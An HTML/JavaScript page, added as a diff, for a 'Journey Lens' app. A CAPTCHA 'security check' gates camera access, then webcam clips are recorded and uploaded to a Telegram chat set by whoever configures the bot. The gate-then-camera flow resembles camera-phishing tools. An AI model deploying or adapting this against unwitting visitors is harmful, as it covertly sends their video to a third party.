@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>Journey Lens · Auto Video + Telegram</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: system-ui, 'Segoe UI', 'Inter', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .glass-panel {
+      max-width: 1400px;
+      width: 100%;
+      background: rgba(18, 25, 45, 0.75);
+      backdrop-filter: blur(14px);
+      border-radius: 2.5rem;
+      border: 1px solid rgba(72, 187, 255, 0.25);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+      padding: 1.8rem;
+      transition: all 0.3s ease;
+    }
+
+    /* Used to hide panels */
+    .hidden {
+      display: none !important;
+    }
+
+    h1 {
+      font-size: 1.9rem;
+      font-weight: 600;
+      background: linear-gradient(135deg, #E0F2FE, #38BDF8);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin: 0 0 0.25rem 0;
+      letter-spacing: -0.3px;
+    }
+
+    .sub {
+      color: #94a3b8;
+      margin-bottom: 1.75rem;
+      border-left: 3px solid #38bdf8;
+      padding-left: 12px;
+      font-size: 0.9rem;
+    }
+
+    /* GATE SCREEN STYLES */
+    #gateScreen {
+      max-width: 450px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    #gateScreen h1 {
+      font-size: 1.6rem;
+    }
+
+    #gateScreen p {
+      color: #94a3b8;
+      font-size: 0.95rem;
+      margin: 0;
+    }
+
+    /* CUSTOM CAPTCHA STYLES */
+    .captcha-container {
+      background: rgba(12, 20, 30, 0.65);
+      padding: 1.2rem;
+      border-radius: 1.2rem;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+      width: 100%;
+    }
+
+    .captcha-display {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    canvas#captchaCanvas {
+      background: #0f172a;
+      border-radius: 0.8rem;
+      border: 1px solid #334155;
+      letter-spacing: 5px;
+    }
+
+    .refresh-btn {
+      background: #1e2a3e;
+      border: 1px solid #334155;
+      color: #38bdf8;
+      font-size: 1.2rem;
+      width: 45px;
+      height: 45px;
+      border-radius: 0.8rem;
+      cursor: pointer;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: 0.2s;
+    }
+
+    .refresh-btn:hover {
+      background: #283a54;
+    }
+
+    .refresh-btn:active {
+      transform: rotate(90deg);
+    }
+
+    input[type="text"] {
+      width: 100%;
+      background: #0f172a;
+      border: 1px solid #334155;
+      padding: 12px 14px;
+      border-radius: 0.8rem;
+      color: white;
+      font-size: 1rem;
+      text-align: center;
+      letter-spacing: 2px;
+      transition: 0.2s;
+    }
+
+    input[type="text"]:focus {
+      outline: none;
+      border-color: #38bdf8;
+      box-shadow: 0 0 0 2px #38bdf855;
+    }
+
+    /* DASHBOARD STYLES */
+    .dashboard {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.8rem;
+    }
+
+    .control-column {
+      flex: 1.2;
+      min-width: 280px;
+      background: rgba(12, 20, 30, 0.65);
+      border-radius: 1.8rem;
+      padding: 1.5rem;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+    }
+
+    .gallery-column {
+      flex: 2;
+      min-width: 280px;
+      background: rgba(12, 20, 30, 0.55);
+      border-radius: 1.8rem;
+      padding: 1.5rem;
+      border: 1px solid rgba(56, 189, 248, 0.2);
+    }
+
+    .video-preview {
+      background: #00000055;
+      border-radius: 1.2rem;
+      overflow: hidden;
+      margin-bottom: 1.5rem;
+      aspect-ratio: 16/9;
+      position: relative;
+      border: 1px solid #2d3a5e;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      background: #0a0f1a;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      margin-top: 15px;
+    }
+
+    button.action-btn {
+      background: #1e2a3e;
+      border: none;
+      padding: 12px 22px;
+      border-radius: 2rem;
+      font-weight: 600;
+      font-size: 0.9rem;
+      color: #e2e8f0;
+      cursor: pointer;
+      transition: 0.2s;
+      flex: 1;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    }
+
+    button.primary {
+      background: linear-gradient(105deg, #0f2b3d, #0e2a44);
+      border: 1px solid #38bdf8;
+      color: #b9f2ff;
+    }
+
+    button.danger {
+      background: #4a1e2c;
+      border-color: #f97316;
+      color: #ffddbb;
+    }
+
+    button.action-btn:active {
+      transform: scale(0.97);
+    }
+
+    button:disabled {
+      opacity: 0.45;
+      transform: none;
+      cursor: not-allowed;
+    }
+
+    .status-area {
+      background: #010a1a80;
+      border-radius: 1rem;
+      padding: 0.8rem;
+      margin-top: 1.2rem;
+      font-size: 0.8rem;
+      font-family: monospace;
+      color: #9ec8ff;
+      max-height: 150px;
+      overflow-y: auto;
+    }
+
+    .journey-gallery {
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      max-height: 540px;
+      overflow-y: auto;
+      padding-right: 6px;
+    }
+
+    .video-card {
+      background: #0b1120cc;
+      border-radius: 1.2rem;
+      padding: 0.7rem;
+      backdrop-filter: blur(4px);
+      border: 1px solid #2d3e60;
+      transition: 0.1s;
+    }
+
+    .video-card video {
+      width: 100%;
+      border-radius: 0.8rem;
+      max-height: 160px;
+      object-fit: cover;
+    }
+
+    .video-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+      font-size: 0.7rem;
+      color: #9cb2d0;
+    }
+
+    .badge {
+      background: #0e2a3a;
+      padding: 4px 8px;
+      border-radius: 20px;
+      font-size: 0.7rem;
+    }
+
+    .empty-gallery {
+      text-align: center;
+      padding: 2rem;
+      color: #62748e;
+    }
+
+    ::-webkit-scrollbar {
+      width: 5px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #0f172a;
+      border-radius: 10px;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #2c4a6e;
+      border-radius: 10px;
+    }
+
+    @media (max-width: 780px) {
+      body { padding: 12px; }
+      .glass-panel { padding: 1rem; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- GATEKEEPER SCREEN (Shows First) -->
+<div id="gateScreen" class="glass-panel">
+  <h1>📸 Welcome to Journey Lens</h1>
+  <p>Please complete the security check and grant camera permissions to access the platform.</p>
+  
+  <!-- CUSTOM CAPTCHA SYSTEM -->
+  <div class="captcha-container">
+    <div class="captcha-display">
+      <canvas id="captchaCanvas" width="180" height="50"></canvas>
+      <button class="refresh-btn" id="refreshCaptchaBtn" title="Get a new code">↻</button>
+    </div>
+    <input type="text" id="captchaInput" placeholder="Enter the code..." autocomplete="off">
+    <div id="captchaStatusMsg" style="font-size: 0.8rem; margin-top: 8px; height: 14px; color: #f97316;"></div>
+  </div>
+  
+  <p id="cameraErrorMsg" style="color: #f97316; font-size: 0.8rem; display: none;">⚠️ Camera permission denied or not found.</p>
+  <button id="grantEnterBtn" class="action-btn primary" style="width: 100%" disabled>✅ Verify & Enter</button>
+</div>
+
+<!-- MAIN DASHBOARD (Hidden Initially) -->
+<div id="mainDashboard" class="glass-panel hidden">
+  <h1>📸 JOURNEY CAPTURE · DASHBOARD</h1>
+  <div class="sub" id="dynamicSubtitle">Auto-video to Telegram → Watch your memories</div>
+
+  <div class="dashboard">
+    <!-- LEFT PANEL: controls, camera -->
+    <div class="control-column">
+      <div class="video-preview">
+        <video id="cameraPreview" autoplay playsinline muted></video>
+      </div>
+
+      <div class="button-group">
+        <button id="startJourneyBtn" class="action-btn primary">🎬 START JOURNEY</button>
+        <button id="stopJourneyBtn" class="action-btn danger" disabled>⏹️ STOP & CLOSE CAM</button>
+      </div>
+
+      <div class="status-area" id="statusLog"></div>
+    </div>
+
+    <!-- RIGHT PANEL: JOURNEY GALLERY -->
+    <div class="gallery-column">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px;">
+        <h3 style="margin:0; color:#bee2ff;">🎞️ Captured Memories</h3>
+        <span class="badge" id="videoCounter">0 / 10 Videos</span>
+      </div>
+      <div id="galleryContainer" class="journey-gallery">
+        <div class="empty-gallery">✨ No memories yet.<br>Start journey to capture videos.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ==========================================
+  // ⚙️ CONFIGURATION SETTINGS
+  // Modify these values according to your needs
+  // ==========================================
+  const CONFIG = {
+    // 1. Your Telegram Bot Token (from @BotFather)
+    BOT_TOKEN: "7312345678:AAGx...your_bot_token", 
+    
+    // 2. Your Telegram Chat ID (Group/Channel ID where bot is Admin)
+    CHAT_ID: "-1001234567890", 
+    
+    // 3. Custom description/caption for your videos sent to Telegram
+    VIDEO_DESCRIPTION: "✨ My Awesome Journey Memory", 
+    
+    // 4. How many seconds each video capture should last
+    CAPTURE_INTERVAL_SECONDS: 5, 
+    
+    // 5. Maximum number of videos to capture for memories (upto 10)
+    MAX_VIDEOS: 10 
+  };
+  // ==========================================
+
+  // ---------- Custom CAPTCHA Logic ----------
+  const canvas = document.getElementById('captchaCanvas');
+  const ctx = canvas.getContext('2d');
+  const captchaInput = document.getElementById('captchaInput');
+  const refreshCaptchaBtn = document.getElementById('refreshCaptchaBtn');
+  const captchaStatusMsg = document.getElementById('captchaStatusMsg');
+  const grantEnterBtn = document.getElementById('grantEnterBtn');
+
+  let currentCaptchaText = "";
+
+  function generateCaptcha() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    
+    // Background fill
+    ctx.fillStyle = "#1e293b";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    
+    // Character set (removed confusing chars like 0, O, 1, I, l)
+    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789";
+    currentCaptchaText = "";
+    
+    // Pick 5 random characters
+    for (let i = 0; i < 5; i++) {
+      currentCaptchaText += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    // Draw characters with slight rotation and noise
+    ctx.font = "bold 26px 'Courier New', Courier, monospace";
+    ctx.textBaseline = "middle";
+    
+    for (let i = 0; i < currentCaptchaText.length; i++) {
+      ctx.save();
+      // Calculate X position
+      const xPos = 25 + (i * 28);
+      const yPos = canvas.height / 2;
+      
+      // Random rotation between -15 and +15 degrees
+      const angle = (Math.random() - 0.5) * 0.5;
+      
+      ctx.translate(xPos, yPos);
+      ctx.rotate(angle);
+      
+      // Random color for text
+      const colors = ["#38bdf8", "#7dd3fc", "#bae6fd", "#e0f2fe"];
+      ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
+      
+      ctx.fillText(currentCaptchaText[i], -10, 0);
+      ctx.restore();
+    }
+
+    // Add noise lines
+    for (let i = 0; i < 4; i++) {
+      ctx.beginPath();
+      ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height);
+      ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height);
+      ctx.strokeStyle = `rgba(255, 255, 255, ${Math.random() * 0.4})`;
+      ctx.lineWidth = 1.5;
+      ctx.stroke();
+    }
+    
+    // Add noise dots
+    for (let i = 0; i < 30; i++) {
+      ctx.fillStyle = `rgba(255, 255, 255, ${Math.random() * 0.5})`;
+      ctx.beginPath();
+      ctx.arc(Math.random() * canvas.width, Math.random() * canvas.height, 1, 0, 2 * Math.PI);
+      ctx.fill();
+    }
+    
+    captchaInput.value = "";
+    checkCaptcha(); // Validate immediately (will be false)
+  }
+
+  function checkCaptcha() {
+    const userInput = captchaInput.value.trim().toLowerCase();
+    const correctText = currentCaptchaText.toLowerCase();
+    
+    if (userInput.length === 0) {
+      captchaStatusMsg.textContent = "";
+      captchaStatusMsg.style.color = "#f97316";
+      grantEnterBtn.disabled = true;
+    } else if (userInput === correctText) {
+      captchaStatusMsg.textContent = "✅ Verification successful!";
+      captchaStatusMsg.style.color = "#34d399";
+      grantEnterBtn.disabled = false;
+    } else if (userInput.length >= 5) {
+      captchaStatusMsg.textContent = "❌ Incorrect code, try again.";
+      captchaStatusMsg.style.color = "#f97316";
+      grantEnterBtn.disabled = true;
+    } else {
+      captchaStatusMsg.textContent = "";
+      grantEnterBtn.disabled = true;
+    }
+  }
+
+  // Initialize CAPTCHA on load
+  generateCaptcha();
+  refreshCaptchaBtn.addEventListener('click', generateCaptcha);
+  captchaInput.addEventListener('input', checkCaptcha);
+
+
+  // ---------- DOM Elements (Dashboard) ----------
+  const gateScreen = document.getElementById('gateScreen');
+  const mainDashboard = document.getElementById('mainDashboard');
+  const cameraErrorMsg = document.getElementById('cameraErrorMsg');
+  
+  const cameraVideo = document.getElementById('cameraPreview');
+  const startBtn = document.getElementById('startJourneyBtn');
+  const stopBtn = document.getElementById('stopJourneyBtn');
+  const statusDiv = document.getElementById('statusLog');
+  const galleryContainer = document.getElementById('galleryContainer');
+  const videoCounter = document.getElementById('videoCounter');
+  const dynamicSubtitle = document.getElementById('dynamicSubtitle');
+
+  // State variables
+  let mediaStream = null;
+  let isJourneyActive = false;
+  let segmentCounter = 0;
+  let recordedClips = [];
+
+  dynamicSubtitle.textContent = `Capturing a ${CONFIG.CAPTURE_INTERVAL_SECONDS}s video every loop → Up to ${CONFIG.MAX_VIDEOS} memories.`;
+
+  // Helper: add status message
+  function addStatus(msg, isError = false) {
+    const p = document.createElement('div');
+    p.textContent = `🕒 ${new Date().toLocaleTimeString()} › ${msg}`;
+    p.style.color = isError ? '#ffb7a0' : '#b9f5ff';
+    p.style.marginBottom = '4px';
+    statusDiv.appendChild(p);
+    statusDiv.scrollTop = statusDiv.scrollHeight;
+    while (statusDiv.children.length > 25) statusDiv.removeChild(statusDiv.firstChild);
+    console.log(msg);
+  }
+
+  // ---------- Gatekeeper Logic ----------
+  grantEnterBtn.addEventListener('click', async () => {
+    grantEnterBtn.textContent = "⏳ Accessing Camera...";
+    grantEnterBtn.disabled = true;
+    
+    try {
+      // Prompt camera before entering the dashboard
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      mediaStream = stream;
+      cameraVideo.srcObject = stream;
+      
+      // Successfully got camera, hide gate, show dashboard
+      cameraErrorMsg.style.display = 'none';
+      gateScreen.classList.add('hidden');
+      mainDashboard.classList.remove('hidden');
+      
+      addStatus("✅ Verification & Permission Granted.");
+      addStatus(`⚙️ Setup: Up to ${CONFIG.MAX_VIDEOS} videos, ${CONFIG.CAPTURE_INTERVAL_SECONDS} sec each.`);
+      
+    } catch (err) {
+      cameraErrorMsg.style.display = 'block';
+      cameraErrorMsg.textContent = `⚠️ Camera error: ${err.message}`;
+      grantEnterBtn.textContent = "✅ Verify & Enter";
+      grantEnterBtn.disabled = false;
+    }
+  });
+
+  // ---------- Gallery functions ----------
+  function addVideoToGallery(blob, timestamp) {
+    const videoURL = URL.createObjectURL(blob);
+    recordedClips.push({ blob, url: videoURL, timestamp });
+    videoCounter.textContent = `${recordedClips.length} / ${CONFIG.MAX_VIDEOS} Videos`;
+    renderGallery();
+  }
+
+  function renderGallery() {
+    galleryContainer.innerHTML = '';
+    if (recordedClips.length === 0) {
+      galleryContainer.innerHTML = '<div class="empty-gallery">✨ No memories yet.<br>Start journey to capture videos.</div>';
+      return;
+    }
+    // Reverse order (newest first)
+    [...recordedClips].reverse().forEach((clip, index) => {
+      const actualClipNum = recordedClips.length - index;
+      const card = document.createElement('div');
+      card.className = 'video-card';
+      const vidElem = document.createElement('video');
+      vidElem.src = clip.url;
+      vidElem.controls = true;
+      vidElem.muted = true;
+      vidElem.playsInline = true;
+      const metaDiv = document.createElement('div');
+      metaDiv.className = 'video-meta';
+      const dateStr = new Date(clip.timestamp).toLocaleTimeString();
+      metaDiv.innerHTML = `<span class="badge">Clip #${actualClipNum}</span><span>${dateStr}</span>`;
+      card.appendChild(vidElem);
+      card.appendChild(metaDiv);
+      galleryContainer.appendChild(card);
+    });
+  }
+
+  // ---------- Telegram sender ----------
+  async function sendVideoToTelegram(videoBlob, clipNumber) {
+    if (!CONFIG.BOT_TOKEN || !CONFIG.CHAT_ID || CONFIG.BOT_TOKEN.includes("your_bot_token")) {
+      addStatus(`⚠️ Clip #${clipNumber} not sent. Telegram credentials missing in code.`, true);
+      return false;
+    }
+    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`;
+    const formData = new FormData();
+    formData.append('chat_id', CONFIG.CHAT_ID);
+    formData.append('video', videoBlob, `memory_${Date.now()}.webm`);
+    
+    // Using Configured Description
+    const finalCaption = `${CONFIG.VIDEO_DESCRIPTION}\n(Memory #${clipNumber}/${CONFIG.MAX_VIDEOS})`;
+    formData.append('caption', finalCaption);
+    formData.append('supports_streaming', 'true');
+
+    try {
+      addStatus(`📤 Sending clip #${clipNumber} to Telegram...`);
+      const response = await fetch(url, { method: 'POST', body: formData });
+      const result = await response.json();
+      if (result.ok) {
+        addStatus(`✅ Clip #${clipNumber} delivered!`);
+        return true;
+      } else {
+        addStatus(`❌ Telegram error: ${result.description}`, true);
+        return false;
+      }
+    } catch (err) {
+      addStatus(`⚠️ Send failed: ${err.message}`, true);
+      return false;
+    }
+  }
+
+  // ---------- Recording one segment ----------
+  async function recordSingleSegment(segmentId) {
+    if (!mediaStream || !isJourneyActive) return false;
+    return new Promise(async (resolve) => {
+      let mediaRecorder;
+      const chunks = [];
+      let mimeType = '';
+      const types = ['video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm'];
+      
+      for (const t of types) {
+        if (MediaRecorder.isTypeSupported(t)) {
+          mimeType = t; break;
+        }
+      }
+      
+      try {
+        mediaRecorder = new MediaRecorder(mediaStream, { mimeType, videoBitsPerSecond: 800000 });
+      } catch(e) {
+        addStatus(`Recorder error: ${e.message}`, true);
+        return resolve(false);
+      }
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data && e.data.size > 0) chunks.push(e.data);
+      };
+
+      mediaRecorder.onstop = async () => {
+        if (!isJourneyActive || chunks.length === 0) return resolve(false);
+        const videoBlob = new Blob(chunks, { type: mimeType || 'video/webm' });
+        
+        // Save to Gallery & send to Telegram
+        addVideoToGallery(videoBlob, Date.now());
+        await sendVideoToTelegram(videoBlob, segmentId);
+        resolve(true);
+      };
+
+      mediaRecorder.start(1000);
+      addStatus(`🎥 Capturing clip #${segmentId} (${CONFIG.CAPTURE_INTERVAL_SECONDS}s)...`);
+      
+      // Stop recording exactly after the configured duration
+      setTimeout(() => {
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+          mediaRecorder.stop();
+        }
+      }, CONFIG.CAPTURE_INTERVAL_SECONDS * 1000);
+    });
+  }
+
+  // ----- Main Loop -----
+  async function startBackgroundCaptureLoop() {
+    while (isJourneyActive) {
+      if (segmentCounter >= CONFIG.MAX_VIDEOS) {
+        addStatus(`🏆 Reached memory limit of ${CONFIG.MAX_VIDEOS} videos! Journey Completed.`);
+        stopJourney();
+        break;
+      }
+      if (!mediaStream || mediaStream.getTracks().some(t => t.readyState === 'ended')) {
+        addStatus("❌ Camera disconnected.", true);
+        stopJourney();
+        break;
+      }
+      segmentCounter++;
+      await recordSingleSegment(segmentCounter);
+      
+      if (isJourneyActive) {
+        await new Promise(r => setTimeout(r, 500)); // Small gap between records
+      }
+    }
+  }
+
+  // ---------- Control Functions ----------
+  function startJourney() {
+    if (recordedClips.length >= CONFIG.MAX_VIDEOS) {
+      addStatus(`❌ Maximum of ${CONFIG.MAX_VIDEOS} videos already reached. Refresh to start over.`, true);
+      return;
+    }
+    
+    isJourneyActive = true;
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    addStatus("🚀 Journey Started!");
+    startBackgroundCaptureLoop();
+  }
+
+  function stopJourney() {
+    isJourneyActive = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    addStatus("⏹️ Journey Stopped.");
+    
+    // We intentionally do not destroy the mediaStream so they can start again,
+    // unless they reached the hard limit.
+    if (recordedClips.length >= CONFIG.MAX_VIDEOS) {
+      startBtn.disabled = true; 
+      addStatus("Limit reached. Please refresh page to capture a new journey.", true);
+      if (mediaStream) {
+         mediaStream.getTracks().forEach(t => t.stop());
+      }
+    }
+  }
+
+  // Listeners
+  startBtn.addEventListener('click', startJourney);
+  stopBtn.addEventListener('click', stopJourney);
+
+  // Cleanup on leave
+  window.addEventListener('beforeunload', () => {
+    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+    recordedClips.forEach(clip => URL.revokeObjectURL(clip.url));
+  });
+</script>
+</body>
+</html>
